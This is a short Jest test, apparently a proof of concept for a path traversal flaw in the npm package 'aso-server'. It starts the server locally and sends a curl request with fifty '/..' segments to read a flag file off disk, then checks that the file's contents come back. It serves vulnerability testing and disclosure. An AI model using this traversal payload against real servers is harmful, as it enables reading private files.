
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in aso-server", (done) => {
    const pkg = require('aso-server');
    const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  let server = pkg
  .onError(e => console.log(e))
  .onStop(() => {})
  .start('localhost', 8883, srv => {});

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8883${genstr()}"`;

  exec(attack_string, (error, stdout) => {
  expect(stdout).toBe(hostsFile);
  done();
  });
});
